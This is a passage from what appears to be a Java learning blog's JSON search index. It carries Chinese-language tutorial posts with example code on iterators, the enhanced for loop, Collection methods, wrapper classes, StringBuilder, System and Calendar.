&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java泛型的概念","slug":"java00157泛型的概念","date":"2020-03-16T03:04:45.000Z","updated":"2020-03-16T03:06:37.802Z","comments":true,"path":"2020/03/16/java00157泛型的概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00157泛型的概念/","excerpt":"","text":"java泛型的概念 在前面学习集合时，我们都知道集合中是可以存放任意对象的，只要把对象存储集合后，那么这时他们都会被提升成Object类型。当我们在取出每一个对象，并且进行相应的操作，这时必须采用类型转换。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java增强for循环","slug":"java00156增强for循环","date":"2020-03-16T01:55:15.000Z","updated":"2020-03-21T14:59:03.006Z","comments":true,"path":"2020/03/16/java00156增强for循环/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00156增强for循环/","excerpt":"","text":"java增强for循环 增强for循环: 底层使用的也是迭代器,使用for循环的格式,简化了迭代器的书写 是JDK1.5之后出现的新特性 Collection&lt;E&gt; extends Iterable&lt;E&gt;:所有的单列集合都可以使用增强for public interface Iterable&lt;T&gt;实现这个接口允许对象成为 “foreach” 语句的目标。 增强for循环: 用来遍历集合和数组 格式: 123for(集合/数组的数据类型 变量名: 集合名/数组名)&#123;sout(变量名);&#125; 1234567891011121314151617181920212223242526272829package com.itheima.demo02.Iterator;import java.util.ArrayList;public class Demo02Foreach &#123; public static void main(String[] args) &#123; demo02(); &#125; //使用增强for循环遍历集合 private static void demo02() &#123; ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); list.add(\"aaa\"); list.add(\"bbb\"); list.add(\"ccc\"); list.add(\"ddd\"); for(String s : list)&#123; System.out.println(s); &#125; &#125; //使用增强for循环遍历数组 private static void demo01() &#123; int[] arr = &#123;1,2,3,4,5&#125;; for(int i:arr)&#123; System.out.println(i); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java迭代器的实现原理","slug":"java00155迭代器的实现原理","date":"2020-03-16T01:52:26.000Z","updated":"2020-03-16T01:53:01.867Z","comments":true,"path":"2020/03/16/java00155迭代器的实现原理/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00155迭代器的实现原理/","excerpt":"","text":"java迭代器的实现原理","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java迭代器的代码实现","slug":"java00154迭代器的代码实现","date":"2020-03-16T01:31:18.000Z","updated":"2020-03-16T01:33:26.732Z","comments":true,"path":"2020/03/16/java00154迭代器的代码实现/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00154迭代器的代码实现/","excerpt":"","text":"java迭代器的代码实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package com.itheima.demo02.Iterator;import java.util.ArrayList;import java.util.Collection;import java.util.Iterator;public class Demo01Iterator &#123; public static void main(String[] args) &#123; //创建一个集合对象 Collection&lt;String&gt; coll = new ArrayList&lt;&gt;(); //往集合中添加元素 coll.add(\"姚明\"); coll.add(\"科比\"); coll.add(\"麦迪\"); coll.add(\"詹姆斯\"); coll.add(\"艾弗森\"); /* 1.使用集合中的方法iterator()获取迭代器的实现类对象,使用Iterator接口接收(多态) 注意: Iterator&lt;E&gt;接口也是有泛型的,迭代器的泛型跟着集合走,集合是什么泛型,迭代器就是什么泛型 */ //多态 接口 实现类对象 Iterator&lt;String&gt; it = coll.iterator(); /* 发现使用迭代器取出集合中元素的代码,是一个重复的过程 所以我们可以使用循环优化 不知道集合中有多少元素,使用while循环 循环结束的条件,hasNext方法返回false */ while(it.hasNext())&#123; String e = it.next(); System.out.println(e); &#125; System.out.println(\"----------------------\"); for(Iterator&lt;String&gt; it2 = coll.iterator();it2.hasNext();)&#123; String e = it2.next(); System.out.println(e); &#125; /* //2.使用Iterator接口中的方法hasNext判断还有没有下一个元素 boolean b = it.hasNext(); System.out.println(b);//true //3.使用Iterator接口中的方法next取出集合中的下一个元素 String s = it.next(); System.out.println(s);//姚明 b = it.hasNext(); System.out.println(b); s = it.next(); System.out.println(s); b = it.hasNext(); System.out.println(b); s = it.next(); System.out.println(s); b = it.hasNext(); System.out.println(b); s = it.next(); System.out.println(s); b = it.hasNext(); System.out.println(b); s = it.next(); System.out.println(s); b = it.hasNext(); System.out.println(b);//没有元素,返回false s = it.next();//没有元素,在取出元素会抛出NoSuchElementException没有元素异常 System.out.println(s);*/ &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java Iterator接口介绍","slug":"java00153Iterator接口介绍","date":"2020-03-16T01:25:33.000Z","updated":"2020-03-21T14:58:04.216Z","comments":true,"path":"2020/03/16/java00153Iterator接口介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00153Iterator接口介绍/","excerpt":"","text":"java Iterator接口介绍 java.util.Iterator接口: 迭代器(对集合进行遍历) 有两个常用的方法 boolean hasNext() 如果仍有元素可以迭代，则返回 true。 判断集合中还有没有下一个元素,有就返回true,没有就返回false E next() 返回迭代的下一个元素。 取出集合中的下一个元素 Iterator迭代器,是一个接口,我们无法直接使用,需要使用Iterator接口的实现类对象,获取实现类的方式比较特殊 Collection接口中有一个方法,叫iterator(),这个方法返回的就是迭代器的实现类对象 Iterator&lt;E&gt; iterator() 返回在此 collection 的元素上进行迭代的迭代器。 迭代器的使用步骤(重点): 1.使用集合中的方法iterator()获取迭代器的实现类对象,使用Iterator接口接收(多态) 2.使用Iterator接口中的方法hasNext判断还有没有下一个元素 3.使用Iterator接口中的方法next取出集合中的下一个元素","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaCollection集合常用功能","slug":"java00152Collection集合常用功能","date":"2020-03-16T01:15:46.000Z","updated":"2020-03-16T01:21:55.456Z","comments":true,"path":"2020/03/16/java00152Collection集合常用功能/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00152Collection集合常用功能/","excerpt":"","text":"java Collection集合常用功能 java.util.Collection接口 所有单列集合的最顶层的接口,里边定义了所有单列集合共性的方法 任意的单列集合都可以使用Collection接口中的方法 共性的方法: public boolean add(E e)：把给定的对象添加到当前集合中 。 public void clear() :清空集合中所有的元素。 public boolean remove(E e): 把给定的对象在当前集合中删除。 public boolean contains(E e): 判断当前集合中是否包含给定的对象。 public boolean isEmpty(): 判断当前集合是否为空。 public int size(): 返回集合中元素的个数。 public Object[] toArray(): 把集合中的元素，存储到数组中。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970package com.itheima.demo01.Collection;import java.util.ArrayList;import java.util.Collection;import java.util.HashSet;public class Demo01Collection &#123; public static void main(String[] args) &#123; //创建集合对象,可以使用多态 //Collection&lt;String&gt; coll = new ArrayList&lt;&gt;(); Collection&lt;String&gt; coll = new HashSet&lt;&gt;(); System.out.println(coll);//重写了toString方法 [] /* public boolean add(E e)： 把给定的对象添加到当前集合中 。 返回值是一个boolean值,一般都返回true,所以可以不用接收 */ boolean b1 = coll.add(\"张三\"); System.out.println(\"b1:\"+b1);//b1:true System.out.println(coll);//[张三] coll.add(\"李四\"); coll.add(\"李四\"); coll.add(\"赵六\"); coll.add(\"田七\"); System.out.println(coll);//[张三, 李四, 赵六, 田七] /* public boolean remove(E e): 把给定的对象在当前集合中删除。 返回值是一个boolean值,集合中存在元素,删除元素,返回true 集合中不存在元素,删除失败,返回false */ boolean b2 = coll.remove(\"赵六\"); System.out.println(\"b2:\"+b2);//b2:true boolean b3 = coll.remove(\"赵四\"); System.out.println(\"b3:\"+b3);//b3:false System.out.println(coll);//[张三, 李四, 田七] /* public boolean contains(E e): 判断当前集合中是否包含给定的对象。 包含返回true 不包含返回false */ boolean b4 = coll.contains(\"李四\"); System.out.println(\"b4:\"+b4);//b4:true boolean b5 = coll.contains(\"赵四\"); System.out.println(\"b5:\"+b5);//b5:false //public boolean isEmpty(): 判断当前集合是否为空。 集合为空返回true,集合不为空返回false boolean b6 = coll.isEmpty(); System.out.println(\"b6:\"+b6);//b6:false //public int size(): 返回集合中元素的个数。 int size = coll.size(); System.out.println(\"size:\"+size);//size:3 //public Object[] toArray(): 把集合中的元素，存储到数组中。 Object[] arr = coll.toArray(); for (int i = 0; i &lt; arr.length; i++) &#123; System.out.println(arr[i]); &#125; //public void clear() :清空集合中所有的元素。但是不删除集合,集合还存在 coll.clear(); System.out.println(coll);//[] System.out.println(coll.isEmpty());//true &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"集合框架介绍","slug":"java00151集合框架介绍","date":"2020-03-16T01:11:41.000Z","updated":"2020-03-16T01:49:00.235Z","comments":true,"path":"2020/03/16/java00151集合框架介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00151集合框架介绍/","excerpt":"","text":"集合框架介绍 JAVASE提供了满足各种需求的API，在使用这些API前，先了解其继承与接口操作架构，才能了解何时采用哪个类，以及类之间如何彼此合作，从而达到灵活应用。 集合按照其存储结构可以分为两大类，分别是单列集合java.util.Collection和双列集合java.util.Map，今天我们主要学习Collection集合，在day04时讲解Map集合。 Collection：单列集合类的根接口，用于存储一系列符合某种规则的元素，它有两个重要的子接口，分别是java.util.List和java.util.Set。其中，List的特点是元素有序、元素可重复。Set的特点是元素无序，而且不可重复。List接口的主要实现类有java.util.ArrayList和java.util.LinkedList，Set接口的主要实现类有java.util.HashSet和java.util.TreeSet。 从上面的描述可以看出JDK中提供了丰富的集合类库，为了便于初学者进行系统地学习，接下来通过一张图来描述整个集合类的继承体系。 其中，橙色框里填写的都是接口类型，而蓝色框里填写的都是具体的实现类。这几天将针对图中所列举的集合类进行逐一地讲解。 集合本身是一个工具，它存放在java.util包中。在Collection接口定义着单列集合框架中最最共性的内容。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Coolection集合概述","slug":"java00150Coolection集合概述","date":"2020-03-16T01:07:15.000Z","updated":"2020-03-21T14:57:33.786Z","comments":true,"path":"2020/03/16/java00150Coolection集合概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/16/java00150Coolection集合概述/","excerpt":"","text":"Coolection集合概述 在前面基础班我们已经学习过并使用过集合ArrayList&lt;E&gt; ,那么集合到底是什么呢? 集合：集合是java中提供的一种容器，可以用来存储多个数据。 集合和数组既然都是容器，它们有啥区别呢？ 数组的长度是固定的。集合的长度是可变的。 数组中存储的是同一类型的元素，可以存储基本数据类型值。集合存储的都是对象。而且对象的类型可以不一致。在开发中一般当对象多的时候，使用集合进行存储。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java包装类_基本类型与字符串类型之间的相互转","slug":"java00149包装类-基本类型与字符串类型之间的相互转","date":"2020-03-15T01:26:47.000Z","updated":"2020-03-15T01:30:58.669Z","comments":true,"path":"2020/03/15/java00149包装类-基本类型与字符串类型之间的相互转/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00149包装类-基本类型与字符串类型之间的相互转/","excerpt":"","text":"java 包装类_基本类型与字符串类型之间的相互转 ​ 基本类型与字符串类型之间的相互转换 基本类型-&gt;字符串(String) ​ 1.基本类型的值+&quot;&quot; 最简单的方法(工作中常用) ​ 2.包装类的静态方法toString(参数),不是Object类的toString() 重载 ​ static String toString(int i) 返回一个表示指定整数的 String 对象。 ​ 3.String类的静态方法valueOf(参数) ​ static String valueOf(int i) 返回 int 参数的字符串表示形式。 字符串(String)-&gt;基本类型 public static byte parseByte(String s)：将字符串参数转换为对应的byte基本类型。 public static short parseShort(String s)：将字符串参数转换为对应的short基本类型。 public static int parseInt(String s)：将字符串参数转换为对应的int基本类型。 public static long parseLong(String s)：将字符串参数转换为对应的long基本类型。 public static float parseFloat(String s)：将字符串参数转换为对应的float基本类型。 public static double parseDouble(String s)：将字符串参数转换为对应的double基本类型。 public static boolean parseBoolean(String s)：将字符串参数转换为对应的boolean基本类型。 ​ 使用包装类的静态方法parseXXX(“字符串”); ​ Integer类: static int parseInt(String s) ​ Double类: static double parseDouble(String s) 1234567891011121314151617181920212223package com.itheima.demo07Integer;public class Demo03Integer &#123; public static void main(String[] args) &#123; //基本类型-&gt;字符串(String) int i1 = 100; String s1 = i1+\"\"; System.out.println(s1+200);//100200 String s2 = Integer.toString(100); System.out.println(s2+200);//100200 String s3 = String.valueOf(100); System.out.println(s3+200);//100200 //字符串(String)-&gt;基本类型 int i = Integer.parseInt(s1); System.out.println(i-10); int a = Integer.parseInt(\"a\");//NumberFormatException System.out.println(a); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java包装类_自动装箱与自动拆箱","slug":"java00148包装类-自动装箱与自动拆箱","date":"2020-03-15T01:24:06.000Z","updated":"2020-03-15T01:25:14.727Z","comments":true,"path":"2020/03/15/java00148包装类-自动装箱与自动拆箱/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00148包装类-自动装箱与自动拆箱/","excerpt":"","text":"java包装类_自动装箱与自动拆箱 自动装箱与自动拆箱:基本类型的数据和包装类之间可以自动的相互转换 JDK1.5之后出现的新特性 1234567891011121314151617181920212223242526272829package com.itheima.demo07Integer;import java.util.ArrayList;public class Demo02Ineger &#123; public static void main(String[] args) &#123; /* 自动装箱:直接把int类型的整数赋值包装类 Integer in = 1; 就相当于 Integer in = new Integer(1); */ Integer in = 1; /* 自动拆箱:in是包装类,无法直接参与运算,可以自动转换为基本数据类型,在进行计算 in+2;就相当于 in.intVale() + 2 = 3 in = in.intVale() + 2 = 3 又是一个自动装箱 */ in = in+2; ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); /* ArrayList集合无法直接存储整数,可以存储Integer包装类 */ list.add(1); //--&gt;自动装箱 list.add(new Integer(1)); int a = list.get(0); //--&gt;自动拆箱 list.get(0).intValue(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java包装类_装箱与拆箱","slug":"java00147包装类-装箱与拆箱","date":"2020-03-15T01:15:57.000Z","updated":"2020-03-15T01:22:51.786Z","comments":true,"path":"2020/03/15/java00147包装类-装箱与拆箱/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00147包装类-装箱与拆箱/","excerpt":"","text":"java包装类_装箱与拆箱 装箱:把基本类型的数据,包装到包装类中(基本类型的数据-&gt;包装类) 构造方法: ​ Integer(int value) 构造一个新分配的 Integer 对象，它表示指定的 int 值。 ​ Integer(String s) 构造一个新分配的 Integer 对象，它表示 String 参数所指示的 int 值。 ​ 传递的字符串,必须是基本类型的字符串,否则会抛出异常 “100” 正确 “a” 抛异常 静态方法: ​ static Integer valueOf(int i) 返回一个表示指定的 int 值的 Integer 实例。 ​ static Integer valueOf(String s) 返回保存指定的 String 的值的 Integer 对象。 ​ 拆箱:在包装类中取出基本类型的数据(包装类-&gt;基本类型的数据) 成员方法: ​ int intValue() 以 int 类型返回该 Integer 的值。 12345678910111213141516171819202122232425package com.itheima.demo07Integer;public class Demo01Integer &#123; public static void main(String[] args) &#123; //装箱:把基本类型的数据,包装到包装类中(基本类型的数据-&gt;包装类) //构造方法 Integer in1 = new Integer(1);//方法上有横线,说明方法过时了 System.out.println(in1);//1 重写了toString方法 Integer in2 = new Integer(\"1\"); System.out.println(in2);//1 //静态方法 Integer in3 = Integer.valueOf(1); System.out.println(in3); //Integer in4 = Integer.valueOf(\"a\");//NumberFormatException数字格式化异常 Integer in4 = Integer.valueOf(\"1\"); System.out.println(in4); //拆箱:在包装类中取出基本类型的数据(包装类-&gt;基本类型的数据) int i = in1.intValue(); System.out.println(i); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java包装类的概念","slug":"java00146包装类的概念","date":"2020-03-15T01:09:51.000Z","updated":"2020-03-15T01:14:33.524Z","comments":true,"path":"2020/03/15/java00146包装类的概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00146包装类的概念/","excerpt":"","text":"java包装类的概念 基本数据类型转包装类类型 基本类型 对应的包装类（位于java.lang包中） byte Byte short Short int Integer long Long float Float double Double char Character boolean Boolean ​ 装箱:把基本类型的数据,包装到包装类中(基本类型的数据-&gt;包装类) 构造方法: Integer(int value) 构造一个新分配的 Integer 对象，它表示指定的 int 值。 Integer(String s) 构造一个新分配的 Integer 对象，它表示 String 参数所指示的 int 值。 传递的字符串,必须是基本类型的字符串,否则会抛出异常 “100” 正确 “a” 抛异常 静态方法: static Integer valueOf(int i) 返回一个表示指定的 int 值的 Integer 实例。 static Integer valueOf(String s) 返回保存指定的 String 的值的 Integer 对象。 拆箱:在包装类中取出基本类型的数据(包装类-&gt;基本类型的数据) 成员方法: ​ int intValue() 以 int 类型返回该 Integer 的值。 12345678910111213141516171819202122232425package com.itheima.demo07Integer;public class Demo01Integer &#123; public static void main(String[] args) &#123; //装箱:把基本类型的数据,包装到包装类中(基本类型的数据-&gt;包装类) //构造方法 Integer in1 = new Integer(1);//方法上有横线,说明方法过时了 System.out.println(in1);//1 重写了toString方法 Integer in2 = new Integer(\"1\"); System.out.println(in2);//1 //静态方法 Integer in3 = Integer.valueOf(1); System.out.println(in3); //Integer in4 = Integer.valueOf(\"a\");//NumberFormatException数字格式化异常 Integer in4 = Integer.valueOf(\"1\"); System.out.println(in4); //拆箱:在包装类中取出基本类型的数据(包装类-&gt;基本类型的数据) int i = in1.intValue(); System.out.println(i); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java StringBuilder的toString方法","slug":"java00145StringBuilder的toString方法","date":"2020-03-15T00:33:49.000Z","updated":"2020-03-15T00:37:21.578Z","comments":true,"path":"2020/03/15/java00145StringBuilder的toString方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00145StringBuilder的toString方法/","excerpt":"","text":"java StringBuilder的toString方法 StringBuilder和String可以相互转换: String-&gt;StringBuilder:可以使用StringBuilder的构造方法 StringBuilder(String str) 构造一个字符串生成器，并初始化为指定的字符串内容。 StringBuilder-&gt;String:可以使用StringBuilder中的toString方法 public String toString()：将当前StringBuilder对象转换为String对象。 1234567891011121314151617package com.itheima.demo06StringBuilder;public class Demo03StringBuilder &#123; public static void main(String[] args) &#123; //String-&gt;StringBuilder String str = \"hello\"; System.out.println(\"str:\"+str); StringBuilder bu = new StringBuilder(str); //往StringBuilder中添加数据 bu.append(\"world\"); System.out.println(\"bu:\"+bu); //StringBuilder-&gt;String String s = bu.toString(); System.out.println(\"s:\"+s); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaStringBuilder的构造方法和append方法","slug":"java00144StringBuilder的构造方法和append方法","date":"2020-03-15T00:30:13.000Z","updated":"2020-03-15T00:32:56.966Z","comments":true,"path":"2020/03/15/java00144StringBuilder的构造方法和append方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00144StringBuilder的构造方法和append方法/","excerpt":"","text":"javaStringBuilder的构造方法和append方法 java.lang.StringBuilder类:字符串缓冲区,可以提高字符串的效率 构造方法: ​ StringBuilder() 构造一个不带任何字符的字符串生成器，其初始容量为 16 个字符。 ​ StringBuilder(String str) 构造一个字符串生成器，并初始化为指定的字符串内容。 StringBuilder的常用方法: ​ public StringBuilder append(…)：添加任意类型数据的字符串形式，并返回当前对象自身。 12345678910111213package com.itheima.demo06StringBuilder;public class Demo01StringBuilder &#123; public static void main(String[] args) &#123; //空参数构造方法 StringBuilder bu1 = new StringBuilder(); System.out.println(\"bu1:\"+bu1);//bu1:\"\" //带字符串的构造方法 StringBuilder bu2 = new StringBuilder(\"abc\"); System.out.println(\"bu2:\"+bu2);//bu2:abc &#125;&#125; 123456789101112131415161718192021222324252627282930package com.itheima.demo06StringBuilder;public class Demo02StringBuilder &#123; public static void main(String[] args) &#123; //创建StringBuilder对象 StringBuilder bu = new StringBuilder(); //使用append方法往StringBuilder中添加数据 //append方法返回的是this,调用方法的对象bu,this==bu //StringBuilder bu2 = bu.append(\"abc\");//把bu的地址赋值给了bu2 //System.out.println(bu);//\"abc\" //System.out.println(bu2);//\"abc\" //System.out.println(bu==bu2);//比较的是地址 true //使用append方法无需接收返回值// bu.append(\"abc\");// bu.append(1);// bu.append(true);// bu.append(8.8);// bu.append('中');// System.out.println(bu);//abc1true8.8中 /* 链式编程:方法返回值是一个对象,可以继续调用方法 */ System.out.println(\"abc\".toUpperCase().toLowerCase().toUpperCase().toLowerCase()); bu.append(\"abc\").append(1).append(true).append(8.8).append('中'); System.out.println(bu);//abc1true8.8中 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaStringBuilder的原理","slug":"java00143StringBuilder的原理","date":"2020-03-15T00:26:49.000Z","updated":"2020-03-15T00:29:04.265Z","comments":true,"path":"2020/03/15/java00143StringBuilder的原理/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00143StringBuilder的原理/","excerpt":"","text":"javaStringBuilder的原理","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaSystem类的常用方法","slug":"java00142System类的常用方法","date":"2020-03-15T00:23:25.000Z","updated":"2020-03-15T00:25:14.188Z","comments":true,"path":"2020/03/15/java00142System类的常用方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00142System类的常用方法/","excerpt":"","text":"System类的常用方法 ​ java.lang.System类中提供了大量的静态方法，可以获取与系统相关的信息或系统级操作，在System类的API文档中，常用的方法有： ​ public static long currentTimeMillis()：返回以毫秒为单位的当前时间。 ​ public static void arraycopy(Object src, int srcPos, Object dest, int destPos, int length)：将数组中指定的数据拷贝到另一个数组中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package com.itheima.demo05.System;import java.util.Arrays;public class Demo01System &#123; public static void main(String[] args) &#123; demo02(); StringBuilder sb = new StringBuilder(); &#125; /* public static void arraycopy(Object src, int srcPos, Object dest, int destPos, int length)：将数组中指定的数据拷贝到另一个数组中。 参数: src - 源数组。 srcPos - 源数组中的起始位置(起始索引)。 dest - 目标数组。 destPos - 目标数据中的起始位置。 length - 要复制的数组元素的数量。 练习: 将src数组中前3个元素，复制到dest数组的前3个位置上 复制元素前： src数组元素[1,2,3,4,5]，dest数组元素[6,7,8,9,10] 复制元素后： src数组元素[1,2,3,4,5]，dest数组元素[1,2,3,9,10] */ private static void demo02() &#123; //定义源数组 int[] src = &#123;1,2,3,4,5&#125;; //定义目标数组 int[] dest = &#123;6,7,8,9,10&#125;; System.out.println(\"复制前:\"+ Arrays.toString(dest)); //使用System类中的arraycopy把源数组的前3个元素复制到目标数组的前3个位置上 System.arraycopy(src,0,dest,0,3); System.out.println(\"复制后:\"+ Arrays.toString(dest)); &#125; /* public static long currentTimeMillis()：返回以毫秒为单位的当前时间。 用来程序的效率 验证for循环打印数字1-9999所需要使用的时间（毫秒） */ private static void demo01() &#123; //程序执行前,获取一次毫秒值 long s = System.currentTimeMillis(); //执行for循环 for (int i = 1; i &lt;=9999 ; i++) &#123; System.out.println(i); &#125; //程序执行后,获取一次毫秒值 long e = System.currentTimeMillis(); System.out.println(\"程序共耗时:\"+(e-s)+\"毫秒\");//程序共耗时:106毫秒 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaCalendar类的常用成员方法","slug":"java00141Calendar类的常用成员方法","date":"2020-03-15T00:19:23.000Z","updated":"2020-03-15T00:20:50.725Z","comments":true,"path":"2020/03/15/java00141Calendar类的常用成员方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00141Calendar类的常用成员方法/","excerpt":"","text":"java Calendar类的常用成员方法 Calendar类的常用成员方法: public int get(int field)：返回给定日历字段的值。 public void set(int field, int value)：将给定的日历字段设置为给定值。 public abstract void add(int field, int amount)：根据日历的规则，为给定的日历字段添加或减去指定的时间量。 public Date getTime()：返回一个表示此Calendar时间值（从历元到现在的毫秒偏移量）的Date对象。 成员方法的参数: int field:日历类的字段,可以使用Calendar类的静态成员变量获取 public static final int YEAR = 1; 年 public static final int MONTH = 2; 月 public static final int DATE = 5; 月中的某一天 public static final int DAY_OF_MONTH = 5;月中的某一天 public static final int HOUR = 10; 时 public static final int MINUTE = 12; 分 public static final int SECOND = 13; 秒 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102package com.itheima.demo04.Calendar;import java.util.Calendar;import java.util.Date;public class Demo02Calendar &#123; public static void main(String[] args) &#123; demo04(); &#125; /* public Date getTime()：返回一个表示此Calendar时间值（从历元到现在的毫秒偏移量）的Date对象。 把日历对象,转换为日期对象 */ private static void demo04() &#123; //使用getInstance方法获取Calendar对象 Calendar c = Calendar.getInstance(); Date date = c.getTime(); System.out.println(date); &#125; /* public abstract void add(int field, int amount)：根据日历的规则，为给定的日历字段添加或减去指定的时间量。 把指定的字段增加/减少指定的值 参数: int field:传递指定的日历字段(YEAR,MONTH...) int amount:增加/减少指定的值 正数:增加 负数:减少 */ private static void demo03() &#123; //使用getInstance方法获取Calendar对象 Calendar c = Calendar.getInstance(); //把年增加2年 c.add(Calendar.YEAR,2); //把月份减少3个月 c.add(Calendar.MONTH,-3); int year = c.get(Calendar.YEAR); System.out.println(year); int month = c.get(Calendar.MONTH); System.out.println(month);//西方的月份0-11 东方:1-12 //int date = c.get(Calendar.DAY_OF_MONTH); int date = c.get(Calendar.DATE); System.out.println(date); &#125; /* public void set(int field, int value)：将给定的日历字段设置为给定值。 参数: int field:传递指定的日历字段(YEAR,MONTH...) int value:给指定字段设置的值 */ private static void demo02() &#123; //使用getInstance方法获取Calendar对象 Calendar c = Calendar.getInstance(); //设置年为9999 c.set(Calendar.YEAR,9999); //设置月为9月 c.set(Calendar.MONTH,9); //设置日9日 c.set(Calendar.DATE,9); //同时设置年月日,可以使用set的重载方法 c.set(8888,8,8); int year = c.get(Calendar.YEAR); System.out.println(year); int month = c.get(Calendar.MONTH); System.out.println(month);//西方的月份0-11 东方:1-12 int date = c.get(Calendar.DATE); System.out.println(date); &#125; /* public int get(int field)：返回给定日历字段的值。 参数:传递指定的日历字段(YEAR,MONTH...) 返回值:日历字段代表的具体的值 */ private static void demo01() &#123; //使用getInstance方法获取Calendar对象 Calendar c = Calendar.getInstance(); int year = c.get(Calendar.YEAR); System.out.println(year); int month = c.get(Calendar.MONTH); System.out.println(month);//西方的月份0-11 东方:1-12 //int date = c.get(Calendar.DAY_OF_MONTH); int date = c.get(Calendar.DATE); System.out.println(date); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Calendar类介绍_获取对象的方式","slug":"java00140Calendar类介绍-获取对象的方式","date":"2020-03-15T00:15:16.000Z","updated":"2020-03-15T00:18:26.786Z","comments":true,"path":"2020/03/15/java00140Calendar类介绍-获取对象的方式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00140Calendar类介绍-获取对象的方式/","excerpt":"","text":"Calendar类介绍_获取对象的方式 java.util.Calendar类: 日历类Calendar类是一个抽象类,里边提供了很多操作日历字段的方法(YEAR、MONTH、DAY_OF_MONTH、HOUR ) Calendar类无法直接创建对象使用,里边有一个静态方法叫getInstance(),该方法返回了Calendar类的子类对象 static Calendar getInstance() 使用默认时区和语言环境获得一个日历。 123456789101112package com.itheima.demo04.Calendar;import java.util.Calendar;public class Demo01Calendar &#123; public static void main(String[] args) &#123; Calendar c = Calendar.getInstance();//多态 System.out.println(c); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"练习_请使用日期时间相关的API，计算出一个人已经出生了多天","slug":"java00139练习-请使用日期时间相关的API，计算出一个人已经出生了多天","date":"2020-03-15T00:00:09.000Z","updated":"2020-03-15T00:01:53.785Z","comments":true,"path":"2020/03/15/java00139练习-请使用日期时间相关的API，计算出一个人已经出生了多天/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00139练习-请使用日期时间相关的API，计算出一个人已经出生了多天/","excerpt":"","text":"练习_请使用日期时间相关的API，计算出一个人已经出生了多天 12345678910111213141516171819202122232425262728293031323334353637package com.itheima.demo03.DateFormat;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date;import java.util.Scanner;/* 练习: 请使用日期时间相关的API，计算出一个人已经出生了多少天。 分析: 1.使用Scanner类中的方法next,获取出生日期 2.使用DateFormat类中的方法parse,把字符串的出生日期,解析为Date格式的出生日期 3.把Date格式的出生日期转换为毫秒值 4.获取当前的日期,转换为毫秒值 5.使用当前日期的毫秒值-出生日期的毫秒值 6.把毫秒差值转换为天(s/1000/60/60/24) */public class Demo02Test &#123; public static void main(String[] args) throws ParseException &#123; //1.使用Scanner类中的方法next,获取出生日期 Scanner sc = new 